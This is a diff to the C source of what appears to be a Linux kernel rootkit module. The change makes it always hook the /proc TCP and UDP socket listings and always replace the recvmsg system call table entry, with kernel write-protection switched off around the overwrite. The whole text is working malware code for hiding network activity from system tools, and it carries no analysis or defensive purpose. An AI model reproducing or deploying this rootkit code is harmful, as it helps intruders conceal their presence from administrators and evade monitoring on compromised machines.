@@ -193,39 +193,34 @@ void hook_sockets(void)
 	
 	while(proc)
 	{	
-		if(strcmp(proc->name, "tcp") == 0 && strcmp(tlp_version, "tcp") == 0)
+		if(strcmp(proc->name, "tcp") == 0)
 		{	
 			tcp_seq = proc->data;
 			original_tcp_show = tcp_seq->seq_ops.show;
 			tcp_seq->seq_ops.show = manipulated_tcp_show;
-			break;
 		}
-		if(strcmp(proc->name, "udp") == 0 && strcmp(tlp_version, "udp") == 0)
+		if(strcmp(proc->name, "udp") == 0)
 		{
 			udp_seq = proc->data;
 			original_udp_show = udp_seq->seq_ops.show;
 			udp_seq->seq_ops.show = manipulated_udp_show;
-			break;
 		} 
 		proc = proc->next;
 	}
 
-	if(strcmp(tlp_version, "tcp") == 0)
-	{	
-        	/* disable the write-protection */
-        	disable_page_protection();
+       	/* disable the write-protection */
+       	disable_page_protection();
 
-        	/*
-       		 * keep pointer to original function in original_recvmsg, and
-        	 * replace the system call in the system call table with
-       	 	 * manipulated_recvmsg
-         	 */
-        	original_recvmsg = (void *)sys_call_table[__NR_recvmsg];
-		sys_call_table[__NR_recvmsg] =  (unsigned long*)manipulated_recvmsg;
+       	/*
+ 	 * keep pointer to original function in original_recvmsg, and
+       	 * replace the system call in the system call table with
+       	 * manipulated_recvmsg
+       	 */
+       	original_recvmsg = (void *)sys_call_table[__NR_recvmsg];
+	sys_call_table[__NR_recvmsg] =  (unsigned long*)manipulated_recvmsg;
         
-		/* reenable the write-protection */
-        	enable_page_protection();
-	}
+	/* reenable the write-protection */
+       	enable_page_protection();
 }
 
 /* unhooks all functions */
@@ -239,7 +234,7 @@ void unhook_sockets(void)
 	
 	while(proc)
 	{
-		if(strcmp(proc->name, "tcp") == 0 && strcmp(tlp_version, "tcp") == 0)
+		if(strcmp(proc->name, "tcp") == 0)
 		{
 			while(tcp_show_call_counter > 0) {
 				msleep(2);
@@ -247,9 +242,8 @@ void unhook_sockets(void)
 			
             		tcp_seq = proc->data;
 	                tcp_seq->seq_ops.show = original_tcp_show;
-            		break;
         	}
-		if(strcmp(proc->name, "udp") == 0 && strcmp(tlp_version, "udp") == 0)
+		if(strcmp(proc->name, "udp") == 0)
 		{
 			while(udp_show_call_counter > 0) {
 				msleep(2);
@@ -257,26 +251,22 @@ void unhook_sockets(void)
 
 			udp_seq = proc->data;
 			udp_seq->seq_ops.show = original_udp_show;
-			break;
 		}
 	
 		proc = proc->next;
 	}
 
-	if(strcmp(tlp_version, "tcp") == 0)
-	{	
-		while(recvmsg_call_counter > 0) {
-			msleep(2);
-		}
-		
-		/* disable the write-protection */
-        	disable_page_protection();
-
-        	/* Return the system call back to original */
-        	sys_call_table[__NR_recvmsg] = (unsigned long *)original_recvmsg;
-	
-        	/* reenable the write-protection */
-        	enable_page_protection();
+	while(recvmsg_call_counter > 0) {
+		msleep(2);
 	}
+		
+	/* disable the write-protection */
+       	disable_page_protection();
+
+       	/* Return the system call back to original */
+       	sys_call_table[__NR_recvmsg] = (unsigned long *)original_recvmsg;
+
+       	/* reenable the write-protection */
+       	enable_page_protection();
 }
 	
